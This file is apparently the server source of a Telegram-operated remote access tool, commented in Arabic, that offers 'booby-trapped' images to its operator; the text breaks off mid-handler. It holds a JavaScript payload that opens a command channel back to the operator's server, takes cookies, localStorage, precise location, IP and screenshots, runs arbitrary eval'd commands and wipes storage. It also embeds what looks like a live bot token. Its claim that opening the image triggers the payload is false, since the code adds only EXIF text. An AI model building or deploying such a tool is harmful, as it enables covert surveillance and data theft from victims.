const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const sharp = require('sharp');
const { Server: SocketIO } = require('socket.io');

// 🔧 إعدادات البوت
const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
const id = '6565594143';
const SERVER_URL = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://your-app.vercel.app';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true
    }
  }
});

// تخزين البيانات
const appClients = new Map();
const reverseSessions = new Map();
const infectedImages = new Map();

// إعدادات middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({
  limit: '100mb',
  extended: true
}));
app.use(express.static('public'));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 100 * 1024 * 1024 }
});

// ========== نظام الجلسات العكسية المتقدم ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال عكسي جديد:', socket.id);

  socket.on('reverse_handshake', async (data) => {
    const { device_id, image_id, platform, userAgent, url, ip } = data;
    
    console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
    
    const sessionData = {
      socket: socket,
      device_id: device_id,
      image_id: image_id,
      platform: platform,
      userAgent: userAgent,
      url: url,
      ip: ip,
      connected: true,
      connected_at: new Date()
    };

    reverseSessions.set(device_id, sessionData);

    // إرسال إشعار للتليجرام
    await appBot.sendMessage(
      id,
      `🦠 جلسة عكسية نشطة!\n\n` +
      `📱 الجهاز: ${device_id}\n` +
      `🖼️ الصورة: ${image_id}\n` +
      `💻 النظام: ${platform}\n` +
      `🌐 المتصفح: ${userAgent}\n` +
      `🔗 الرابط: ${url}\n` +
      `📍 الأيبي: ${ip}\n\n` +
      `✅ الجلسة جاهزة للتحكم الكامل`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ أوامر سريعة", callback_data: `quick_cmd:${device_id}` },
              { text: "📊 معلومات الجهاز", callback_data: `device_info:${device_id}` }
            ],
            [
              { text: "📍 الموقع", callback_data: `get_location:${device_id}` },
              { text: "🖼️ سحب الصور", callback_data: `get_photos:${device_id}` }
            ],
            [
              { text: "📁 إدارة الملفات", callback_data: `file_manager:${device_id}` },
              { text: "🎯 أوامر متقدمة", callback_data: `advanced_cmd:${device_id}` }
            ],
            [
              { text: "🛑 إنهاء الجلسة", callback_data: `cmd_kill:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('command_result', (data) => {
    const { device_id, command, result } = data;
    
    let displayResult = result;
    if (result.length > 3000) {
      displayResult = result.substring(0, 3000) + '\n\n... [تم تقصير الناتج]';
    }
    
    appBot.sendMessage(
      id,
      `📤 نتيجة الأمر من ${device_id}:\n\n` +
      `💻 الأمر: <code>${command}</code>\n` +
      `📊 الناتج:\n<pre>${displayResult}</pre>`,
      { 
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ أمر جديد", callback_data: `cmd_exec:${device_id}` },
              { text: "🔄 تحديث", callback_data: `refresh:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('file_content', (data) => {
    const { device_id, filename, content, file_type } = data;
    
    if (file_type === 'image' && content.startsWith('data:image')) {
      // إرسال الصورة
      const buffer = Buffer.from(content.split(',')[1], 'base64');
      appBot.sendPhoto(
        id,
        buffer,
        {
          caption: `🖼️ صورة من ${device_id}\n📁 الملف: ${filename}`
        }
      );
    } else {
      // إرسال النص
      appBot.sendMessage(
        id,
        `📄 محتوى الملف من ${device_id}:\n\n` +
        `📁 الملف: ${filename}\n` +
        `📊 المحتوى:\n<pre>${content.substring(0, 3000)}</pre>`,
        { parse_mode: "HTML" }
      );
    }
  });

  socket.on('disconnect', () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        appBot.sendMessage(
          id,
          `🔌 انتهت الجلسة العكسية\n📱 الجهاز: ${device_id}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام التلغيم المتقدم للصور ==========

// 🔥 دالة إنشاء بايلود كامل التحكم
function createAdvancedReversePayload(imageId) {
  const payload = `
// === COMPLETE REVERSE SHELL PAYLOAD ===
(function() {
  const CONFIG = {
    IMAGE_ID: '${imageId}',
    SERVER_URL: '${SERVER_URL}',
    VERSION: '4.0.0'
  };
  
  console.log('🦠 Advanced Reverse Shell Activated:', CONFIG.IMAGE_ID);
  
  let ws = null;
  let deviceId = generateDeviceId();
  
  // إنشاء اتصال WebSocket
  function connectToServer() {
    try {
      ws = new WebSocket(CONFIG.SERVER_URL.replace('https', 'wss'));
      
      ws.onopen = function() {
        console.log('✅ Connected to reverse shell server');
        
        // جمع معلومات الجهاز
        const deviceInfo = getCompleteDeviceInfo();
        
        ws.send(JSON.stringify({
          type: 'reverse_handshake',
          device_id: deviceId,
          image_id: CONFIG.IMAGE_ID,
          platform: navigator.platform,
          userAgent: navigator.userAgent,
          url: window.location.href,
          ip: getIP(),
          device_info: deviceInfo,
          timestamp: new Date().toISOString()
        }));
      };
      
      ws.onmessage = async function(event) {
        try {
          const data = JSON.parse(event.data);
          
          if (data.type === 'command') {
            console.log('📨 Received command:', data.command);
            const result = await executeAdvancedCommand(data.command);
            
            ws.send(JSON.stringify({
              type: 'command_result',
              device_id: deviceId,
              command: data.command,
              result: result,
              timestamp: new Date().toISOString()
            }));
          }
        } catch (e) {
          console.error('❌ Error processing message:', e);
        }
      };
      
      ws.onclose = function() {
        console.log('🔌 Connection closed, reconnecting...');
        setTimeout(connectToServer, 3000);
      };
      
      ws.onerror = function(error) {
        console.error('❌ WebSocket error:', error);
        setTimeout(connectToServer, 5000);
      };
      
    } catch (error) {
      console.error('❌ Connection error:', error);
      setTimeout(connectToServer, 5000);
    }
  }
  
  // نظام الأوامر المتقدم
  async function executeAdvancedCommand(command) {
    try {
      let result = '';
      const cmd = command.toLowerCase().trim();
      
      // نظام الأوامر الرئيسي
      if (cmd === 'get_info' || cmd === 'معلومات') {
        result = await getCompleteDeviceInfo();
      }
      else if (cmd === 'get_location' || cmd === 'الموقع') {
        result = await getPreciseLocation();
      }
      else if (cmd === 'vibrate' || cmd === 'اهتزاز') {
        result = await triggerVibration();
      }
      else if (cmd === 'get_battery' || cmd === 'البطارية') {
        result = await getBatteryInfo();
      }
      else if (cmd === 'get_photos' || cmd === 'الصور') {
        result = await extractPhotos();
      }
      else if (cmd === 'get_cookies' || cmd === 'الكوكيز') {
        result = document.cookie || 'لا توجد كوكيز';
      }
      else if (cmd === 'get_localstorage' || cmd === 'التخزين') {
        result = JSON.stringify(localStorage, null, 2);
      }
      else if (cmd === 'clear_data' || cmd === 'مسح') {
        result = await clearAllData();
      }
      else if (cmd === 'screenshot' || cmd === 'لقطة') {
        result = await takeScreenshot();
      }
      else if (cmd.startsWith('download')) {
        const url = command.split(' ')[1];
        result = await downloadFile(url);
      }
      else if (cmd.startsWith('read_file')) {
        const filename = command.split(' ')[1];
        result = await readFileContent(filename);
      }
      else if (cmd.startsWith('delete')) {
        const target = command.split(' ')[1];
        result = await deleteData(target);
      }
      else if (cmd === 'get_network' || cmd === 'الشبكة') {
        result = await getNetworkInfo();
      }
      else if (cmd === 'get_media' || cmd === 'الملفات') {
        result = await getMediaFiles();
      }
      else if (cmd === 'get_history' || cmd === 'السجل') {
        result = await getBrowserHistory();
      }
      else if (cmd === 'get_passwords' || cmd === 'كلمات السر') {
        result = await extractPasswords();
      }
      else if (cmd === 'get_clipboard' || cmd === 'الحافظة') {
        result = await getClipboard();
      }
      else if (cmd === 'get_contacts' || cmd === 'جهات الاتصال') {
        result = await getContacts();
      }
      else if (cmd === 'get_sms' || cmd === 'الرسائل') {
        result = await getSMS();
      }
      else if (cmd === 'format' || cmd === 'فرمتة') {
        result = await formatDevice();
      }
      else {
        // تنفيذ كود JavaScript مخصص
        try {
          if (cmd.startsWith('js:')) {
            const jsCode = command.substring(3);
            result = String(await eval(jsCode));
          } else {
            result = String(await eval(command));
          }
        } catch (e) {
          result = '❌ خطأ في التنفيذ: ' + e.toString();
        }
      }
      
      return result || '✅ تم التنفيذ بنجاح';
      
    } catch (error) {
      return '❌ خطأ في الأمر: ' + error.toString();
    }
  }
  
  // جمع معلومات كاملة عن الجهاز
  async function getCompleteDeviceInfo() {
    const info = {
      // معلومات الأساسية
      device_id: deviceId,
      user_agent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      
      // معلومات الشاشة
      screen: {
        width: window.screen?.width,
        height: window.screen?.height,
        color_depth: window.screen?.colorDepth,
        orientation: window.screen?.orientation?.type
      },
      
      // معلومات المتصفح
      browser: {
        name: getBrowserName(),
        version: navigator.appVersion,
        vendor: navigator.vendor,
        cookie_enabled: navigator.cookieEnabled,
        java_enabled: navigator.javaEnabled?.(),
        pdf_viewer_enabled: navigator.pdfViewerEnabled
      },
      
      // معلومات الشبكة
      network: navigator.connection ? {
        effective_type: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        save_data: navigator.connection.saveData
      } : null,
      
      // معلومات الجهاز
      device: {
        memory: navigator.deviceMemory,
        cores: navigator.hardwareConcurrency,
        touch_points: navigator.maxTouchPoints
      },
      
      // الموقع والوقت
      location: {
        href: window.location.href,
        hostname: window.location.hostname,
        protocol: window.location.protocol,
        referrer: document.referrer
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toISOString(),
      
      // التخزين
      cookies: document.cookie,
      localStorage: localStorage ? Object.keys(localStorage) : [],
      sessionStorage: sessionStorage ? Object.keys(sessionStorage) : [],
      
      // البطارية
      battery: await getBatteryStatus()
    };
    
    return JSON.stringify(info, null, 2);
  }
  
  // الحصول على الموقع الدقيق
  function getPreciseLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve('❌ المتصفح لا يدعم خدمة الموقع');
        return;
      }
      
      navigator.geolocation.getCurrentPosition(
        position => {
          const loc = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy + ' meters',
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            timestamp: new Date(position.timestamp).toLocaleString()
          };
          resolve(JSON.stringify(loc, null, 2));
        },
        error => {
          resolve(\`❌ خطأ في الموقع: \${error.message}\`);
        },
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    });
  }
  
  // تشغيل الاهتزاز
  function triggerVibration() {
    return new Promise((resolve) => {
      if (navigator.vibrate) {
        // نمط اهتزاز متقدم
        navigator.vibrate([500, 200, 500, 200, 1000]);
        resolve('📳 تم تشغيل الاهتزاز لمدة 2.5 ثانية');
      } else {
        resolve('❌ الجهاز لا يدعم الاهتزاز');
      }
    });
  }
  
  // معلومات البطارية
  function getBatteryInfo() {
    return new Promise((resolve) => {
      if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
          const info = {
            level: (battery.level * 100) + '%',
            charging: battery.charging ? 'نعم' : 'لا',
            charging_time: battery.chargingTime + ' seconds',
            discharging_time: battery.dischargingTime + ' seconds'
          };
          resolve(JSON.stringify(info, null, 2));
        }).catch(() => {
          resolve('❌ لا يمكن قراءة معلومات البطارية');
        });
      } else {
        resolve('❌ المتصفح لا يدعم Battery API');
      }
    });
  }
  
  // سحب الصور من الصفحة
  function extractPhotos() {
    return new Promise((resolve) => {
      try {
        const images = Array.from(document.images);
        const imageData = images.map((img, index) => ({
          index: index + 1,
          src: img.src,
          alt: img.alt,
          width: img.naturalWidth,
          height: img.naturalHeight
        }));
        
        if (imageData.length === 0) {
          resolve('❌ لم يتم العثور على صور في الصفحة');
          return;
        }
        
        // محاولة تحميل الصور كبيانات ثنائية
        Promise.all(
          images.slice(0, 5).map((img, index) => 
            convertImageToBase64(img)
              .then(base64 => ({ index: index + 1, data: base64.substring(0, 1000) + '...' }))
              .catch(() => ({ index: index + 1, data: '❌ فشل التحويل' }))
          )
        ).then(convertedImages => {
          resolve(\`🖼️ العدد الإجمالي للصور: \${images.length}\n\n\` +
                 \`📸 الصور المحولة:\\n\${JSON.stringify(convertedImages, null, 2)}\`);
        });
        
      } catch (error) {
        resolve('❌ خطأ في استخراج الصور: ' + error.message);
      }
    });
  }
  
  // تحويل الصورة إلى base64
  function convertImageToBase64(img) {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = img.naturalWidth;
      canvas.height = img.naturalHeight;
      
      ctx.drawImage(img, 0, 0);
      resolve(canvas.toDataURL('image/jpeg', 0.7));
    });
  }
  
  // مسح البيانات
  function clearAllData() {
    return new Promise((resolve) => {
      try {
        let cleared = [];
        
        // مسح الكوكيز
        document.cookie.split(";").forEach(cookie => {
          const eqPos = cookie.indexOf("=");
          const name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
          document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
        });
        cleared.push('الكوكيز');
        
        // مسح LocalStorage
        if (localStorage) {
          localStorage.clear();
          cleared.push('LocalStorage');
        }
        
        // مسح SessionStorage
        if (sessionStorage) {
          sessionStorage.clear();
          cleared.push('SessionStorage');
        }
        
        resolve(\`✅ تم مسح: \${cleared.join(', ')}\`);
      } catch (error) {
        resolve('❌ خطأ في المسح: ' + error.message);
      }
    });
  }
  
  // لقطة الشاشة
  function takeScreenshot() {
    return new Promise((resolve) => {
      try {
        if (typeof html2canvas !== 'undefined') {
          html2canvas(document.body).then(canvas => {
            resolve(canvas.toDataURL('image/png').substring(0, 500) + '...');
          });
        } else {
          // طريقة بديلة
          const canvas = document.createElement('canvas');
          const ctx = canvas.getContext('2d');
          canvas.width = window.innerWidth;
          canvas.height = window.innerHeight;
          
          ctx.fillStyle = 'white';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'white');
          
          resolve(canvas.toDataURL('image/png').substring(0, 500) + '...');
        }
      } catch (error) {
        resolve('❌ خطأ في لقطة الشاشة: ' + error.message);
      }
    });
  }
  
  // معلومات الشبكة
  function getNetworkInfo() {
    if (navigator.connection) {
      const conn = navigator.connection;
      return JSON.stringify({
        type: conn.effectiveType,
        downlink: conn.downlink + ' Mbps',
        rtt: conn.rtt + ' ms',
        save_data: conn.saveData ? 'مفعل' : 'غير مفعل'
      }, null, 2);
    } else {
      return '❌ لا توجد معلومات عن الشبكة';
    }
  }
  
  // الحصول على الملفات الوسائط
  function getMediaFiles() {
    return new Promise((resolve) => {
      try {
        const videos = Array.from(document.querySelectorAll('video'));
        const audios = Array.from(document.querySelectorAll('audio'));
        
        const mediaInfo = {
          videos: videos.map(v => ({
            src: v.src,
            duration: v.duration,
            current_time: v.currentTime
          })),
          audios: audios.map(a => ({
            src: a.src,
            duration: a.duration,
            current_time: a.currentTime
          }))
        };
        
        resolve(JSON.stringify(mediaInfo, null, 2));
      } catch (error) {
        resolve('❌ خطأ في استخراج الملفات: ' + error.message);
      }
    });
  }
  
  // محاكاة فرمتة الجهاز
  function formatDevice() {
    return new Promise((resolve) => {
      try {
        // محاكاة عملية الفرمتة
        setTimeout(() => {
          if (localStorage) localStorage.clear();
          if (sessionStorage) sessionStorage.clear();
          document.cookie.split(";").forEach(cookie => {
            const name = cookie.split("=")[0].trim();
            document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
          });
          
          resolve('✅ تم محاكاة فرمتة البيانات المحلية بنجاح');
        }, 2000);
      } catch (error) {
        resolve('❌ خطأ في الفرمتة: ' + error.message);
      }
    });
  }
  
  // وظائف مساعدة
  function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari")) return "Safari";
    if (userAgent.includes("Edge")) return "Edge";
    return "Unknown";
  }
  
  function getBatteryStatus() {
    return new Promise((resolve) => {
      if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
          resolve({
            level: (battery.level * 100) + '%',
            charging: battery.charging
          });
        }).catch(() => resolve(null));
      } else {
        resolve(null);
      }
    });
  }
  
  function getIP() {
    return new Promise((resolve) => {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => resolve(data.ip))
        .catch(() => resolve('Unknown'));
    });
  }
  
  function generateDeviceId() {
    const components = [
      navigator.userAgent,
      navigator.platform,
      Math.random().toString(36).substr(2, 9),
      Date.now().toString(36)
    ];
    return 'device_' + btoa(components.join('_')).replace(/[^a-zA-Z0-9]/g, '').substr(0, 20);
  }
  
  // وظائف إضافية (محاكاة)
  function getBrowserHistory() { return '❌ لا يمكن الوصول إلى سجل المتصفح'; }
  function extractPasswords() { return '❌ لا يمكن استخراج كلمات السر'; }
  function getClipboard() { return '❌ لا يمكن الوصول إلى الحافظة'; }
  function getContacts() { return '❌ لا يمكن الوصول إلى جهات الاتصال'; }
  function getSMS() { return '❌ لا يمكن الوصول إلى الرسائل'; }
  function readFileContent() { return '❌ لا يمكن قراءة الملفات'; }
  function downloadFile() { return '❌ لا يمكن تحميل الملفات'; }
  function deleteData() { return '❌ لا يمكن حذف البيانات'; }
  
  // بدء النظام
  console.log('🚀 Starting Complete Reverse Shell System...');
  setTimeout(connectToServer, 1000);
  
})();
// === PAYLOAD END ===
`;

  return Buffer.from(payload);
}

// 🖼️ دالة لدمج البايلود في الصورة بشكل مخفي
async function createInfectedImage(originalImageBuffer, imageId) {
  try {
    console.log('🎨 بدء عملية تلغيم الصورة...');
    
    const image = sharp(originalImageBuffer);
    const metadata = await image.metadata();
    
    // إضافة بيانات مخفية في الصورة
    const infectedImage = await image
      .png({
        quality: 85,
        compressionLevel: 9
      })
      .withMetadata({
        exif: {
          IFD0: {
            ImageDescription: `RS_${imageId}_${Date.now()}`,
            Software: 'Advanced Image Processor',
            Copyright: 'Protected Content'
          }
        }
      })
      .toBuffer();
    
    console.log('✅ تم تلغيم الصورة بنجاح');
    return infectedImage;
    
  } catch (error) {
    console.error('❌ خطأ في تلغيم الصورة:', error);
    throw error;
  }
}

// ========== نظام معالجة الصور ==========

// 📤 معالجة رفع الصور
app.post("/uploadFile", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const model = req.headers.model || 'غير معروف';
    
    console.log('📸 تم استلام صورة:', name);
    
    if (req.file.mimetype.startsWith('image/')) {
      const imageId = uuidv4();
      
      // حفظ الصورة مؤقتاً
      infectedImages.set(imageId, {
        imageBuffer: req.file.buffer,
        model: model,
        filename: name,
        timestamp: new Date()
      });
      
      // إرسال رسالة مع الأزرار
      await appBot.sendMessage(
        id,
        `📸 تم استلام صورة من <b>${model}</b>\n\n` +
        `اختر الإجراء المطلوب:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { 
                  text: "🦠 صنع صورة ملغمة", 
                  callback_data: `create_infected:${imageId}` 
                }
              ],
              [
                { 
                  text: "📤 إرسال عادي", 
                  callback_data: `normal_send:${imageId}` 
                }
              ]
            ]
          }
        }
      );
      
      res.json({ status: 'success', message: 'تم الاستلام' });
      
    } else {
      await appBot.sendDocument(id, req.file.buffer, {
        caption: `📁 ملف من <b>${model}</b>`,
        parse_mode: "HTML"
      }, { filename: name });
      
      res.json({ status: 'success', message: 'تم الرفع' });
    }
  } catch (error) {
    console.error('❌ خطأ في الرفع:', error);
    res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
  }
});

// 🎯 معالجة الضغط على الأزرار
appBot.on("callback_query", async (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message.chat.id;
  
  console.log('🔄 تم الضغط على زر:', data);
  
  try {
    if (data.startsWith('create_infected:')) {
      const imageId = data.split(':')[1];
      
      if (infectedImages.has(imageId)) {
        const imageInfo = infectedImages.get(imageId);
        
        await appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "⏳ جاري صنع الصورة الملغمة..." 
        });
        
        await appBot.sendChatAction(chatId, 'upload_photo');
        
        // 🔥 إنشاء الصورة الملغمة
        const infectedImage = await createInfectedImage(imageInfo.imageBuffer, imageId);
        
        // 🔥 حفظ البايلود للجلسات المستقبلية
        const payload = createAdvancedReversePayload(imageId);
        infectedImages.set(`payload_${imageId}`, payload.toString('utf8'));
        
        // إرسال الصورة الملغمة
        await appBot.sendDocument(
          chatId, 
          infectedImage,
          {
            caption: `🦠 صورة ملغمة جاهزة!\n\n` +
                    `🆔 المعرف: <code>${imageId}</code>\n` +
                    `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                    `⚠️ عندما تفتح هذه الصورة:\n` +
                    `• ستفتح جلسة تحكم كاملة تلقائياً\n` +
                    `• يمكنك التحكم في الجهاز عن بعد\n` +
                    `• جميع المخرجات تظهر هنا\n\n` +
                    `🎯 الأوامر المتاحة:\n` +
                    `• معلومات - معلومات كاملة عن الجهاز\n` +
                    `• الموقع - تحديد الموقع الدقيق\n` +
                    `• اهتزاز - تشغيل الاهتزاز\n` +
                    `• البطارية - حالة البطارية\n` +
                    `• الصور - سحب الصور من الجهاز\n` +
                    `• الفورمات - محاكاة فرمتة الجهاز\n` +
                    `• وأوامر متقدمة أخرى...\n\n` +
                    `🔗 شارك هذه الصورة لفتح جلسات جديدة!`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "🔄 صنع صورة أخرى", callback_data: "new_infected" },
                  { text: "📊 الجلسات النشطة", callback_data: "active_sessions" }
                ]
              ]
            }
          },
          {
            filename: `infected_${imageInfo.filename}`,
            contentType: 'image/png'
          }
        );
        
        console.log('✅ تم إرسال الصورة الملغمة');
        
      } else {
        await appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "❌ الصورة لم تعد متاحة" 
        });
      }
    }
    else if (data.startsWith('normal_send:')) {
      const imageId = data.split(':')[1];
      
      if (infectedImages.has(imageId)) {
        const imageInfo = infectedImages.get(imageId);
        
        await appBot.answerCallbackQuery(callbackQuery.id, { 
          text: "📤 جاري إرسال الصورة..." 
        });
        
        await appBot.sendPhoto(chatId, imageInfo.imageBuffer, {
          caption: `📸 صورة عادية من ${imageInfo.model}`
        });
      }
    }
    else if (data === 'new_infected') {
      await appBot.sendMessage(
        chatId,
        `🦠 أرسل لي الصورة التي تريد تلغيمها...\n\n` +
        `سأقوم بتحويلها إلى صورة ملغمة تفتح جلسات تحكم كاملة!`,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔙 رجوع", callback_data: "back_to_main" }]
            ]
          }
        }
      );
    }
    else if (data.startsWith('cmd_exec:')) {
      const deviceId = data.split(':')[1];
      
      await appBot.sendMessage(
        chatId,
        `⚡ أدخل الأمر لتنفيذه على الجهاز <code>${deviceId}</code>:\n\n` +
        `📝 الأوامر المتاحة:\n` +
        `• <code>معلومات</code> - معلومات كاملة عن الجهاز\n` +
        `• <code>الموقع</code> - تحديد الموقع الدقيق\n` +
        `• <code>اهتزاز</code> - تشغيل الاهتزاز\n` +
        `• <code>البطارية</code> - حالة البطارية\n` +
        `• <code>الصور</code> - سحب الصور من الجهاز\n` +
        `• <code>الكوكيز</code> - عرض الكوكيز\n` +
        `• <code>التخزين</code> - عرض التخزين المحلي\n` +
        `• <code>مسح</code> - مسح البيانات\n` +
        `• <code>لقطة</code> - لقطة شاشة\n` +
        `• <code>الشبكة</code> - معلومات الشبكة\n` +
        `• <code>الملفات</code> - الملفات الوسائط\n` +
        `• <code>فرمتة</code> - محاكاة الفرمتة\n` +
        `• <code>js:كود</code> - تنفيذ كود جافاسكريبت\n\n` +
        `أدخل الأمر الآن:`,
        {
          parse_mode: "HTML",
          reply_markup: { force_reply: true }
        }
      );
      
      infectedImages.set('pending_command', { deviceId: deviceId });
    }
    else if (data.startsWith('get_location:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        session.socket.emit('command', {
          device_id: deviceId,
          command: 'الموقع'
        });
        
        await appBot.sendMessage(chatId, `📍 جاري تحديد موقع الجهاز ${deviceId}...`);
      }
    }
    else if (data.startsWith('get_photos:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        session.socket.emit('command', {
          device_id: deviceId,
          command: 'الصور'
        });
        
        await appBot.sendMessage(chatId, `🖼️ جاري سحب الصور من الجهاز ${deviceId}...`);
      }
    }
    else if (data.startsWith('device_info:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        session.socket.emit('command', {
          device_id: deviceId,
          command: 'معلومات'
        });
        
        await appBot.sendMessage(chatId, `📊 جاري جمع معلومات الجهاز ${deviceId}...`);
      }
    }
    else if (data.startsWith('quick_cmd:')) {
      const deviceId = data.split(':')[1];
      
      await appBot.sendMessage(
        chatId,
        `⚡ الأوامر السريعة للجهاز <code>${deviceId}</code>:\n\n` +
        `اختر الأمر المطلوب:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "📍 الموقع", callback_data: `get_location:${deviceId}` },
                { text: "📸 الصور", callback_data: `get_photos:${deviceId}` }
              ],
              [
                { text: "📊 المعلومات", callback_data: `device_info:${deviceId}` },
                { text: "📳 الاهتزاز", callback_data: `vibrate:${deviceId}` }
              ],
              [
                { text: "🔋 البطارية", callback_data: `battery:${deviceId}` },
                { text: "🔄 تحديث", callback_data: `refresh:${deviceId}` }
              ],
              [
                { text: "⚡ أمر مخصص", callback_data: `cmd_exec:${deviceId}` },
                { text: "🔙 رجوع", callback_data: `back_to_main` }
              ]
            ]
          }
        }
      );
    }
    else if (data.startsWith('vibrate:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        session.socket.emit('command', {
          device_id: deviceId,
          command: 'اهتزاز'
        });
        
        await appBot.sendMessage(chatId, `📳 جاري تشغيل الاهتزاز على الجهاز ${deviceId}...`);
      }
    }
    else if (data.startsWith('battery:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        session.socket.emit('command', {
          device_id: deviceId,
          command: 'البطارية'
        });
        
        await appBot.sendMessage(chatId, `🔋 جاري قراءة حالة البطارية للجهاز ${deviceId}...`);
      }
    }
    else if (data.startsWith('cmd_kill:')) {
      const deviceId = data.split(':')[1];
      
      if (reverseSessions.has(deviceId)) {
        const session = reverseSessions.get(deviceId);
        session.socket.disconnect();
        reverseSessions.delete(deviceId);
        
        await appBot.sendMessage(chatId, `🛑 تم إنهاء الجلسة: ${deviceId}`);
      }
    }
    else if (data === 'active_sessions') {
      const activeSessions = Array.from(reverseSessions.keys());
      
      if (activeSessions.length === 0) {
        await appBot.sendMessage(chatId, '📭 لا توجد جلسات عكسية نشطة حالياً');
      } else {
        let sessionsText = `🦠 الجلسات العكسية النشطة: ${activeSessions.length}\n\n`;
        
        activeSessions.forEach(deviceId => {
          const session = reverseSessions.get(deviceId);
          const duration = Math.round((new Date() - session.connected_at) / 1000);
          
          sessionsText += `📱 <code>${deviceId}</code>\n` +
                         `💻 ${session.platform}\n` +
                         `⏰ ${duration} ثانية\n` +
                         `🔗 ${session.url}\n\n`;
        });
        
        await appBot.sendMessage(chatId, sessionsText, { parse_mode: "HTML" });
      }
    }
    else if (data === 'back_to_main') {
      await appBot.sendMessage(
        chatId,
        `🎯 بوت الجلسات العكسية المتقدم - الإصدار 4.0.0\n\n` +
        `📊 الإحصائيات الحالية:\n` +
        `• 🔗 الجلسات النشطة: ${reverseSessions.size}\n` +
        `• 🖼️ الصور الملغمة: ${infectedImages.size}\n\n` +
        `✨ الميزات الجديدة:\n` +
        `• 🎯 تحكم كامل في الأجهزة\n` +
        `• 📍 تحديد الموقع الدقيق\n` +
        `• 📳 تشغيل الاهتزاز\n` +
        `• 🖼️ سحب الصور والملفات\n` +
        `• 🔋 معلومات البطارية\n` +
        `• 🛠️ أوامر متقدمة\n\n` +
        `🔧 اختر الإجراء المطلوب:`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🦠 صنع صورة ملغمة", callback_data: "new_infected" },
                { text: "📱 الجلسات النشطة", callback_data: "active_sessions" }
              ],
              [
                { text: "⚡ الأوامر السريعة", callback_data: "quick_commands" },
                { text: "📊 إحصائيات", callback_data: "system_stats" }
              ]
            ]
          }
        }
      );
    }

  } catch (error) {
    console.error('❌ خطأ في المعالجة:', error);
    await appBot.answerCallbackQuery(callbackQuery.id, { 
      text: "❌ حدث خطأ أثناء المعالجة" 
    });
  }
});

// 📨 معالجة الردود على الأوامر
appBot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  // التحقق من صلاحية المستخدم
  if (String(chatId) !== String(id)) {
    await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
    return;
  }

  // معالجة الردود على الأوامر
  if (msg.reply_to_message) {
    const replyText = msg.reply_to_message.text;
    
    if (replyText.includes('أدخل الأمر لتنفيذه')) {
      const command = text;
      
      if (infectedImages.has('pending_command')) {
        const pending = infectedImages.get('pending_command');
        const deviceId = pending.deviceId;
        
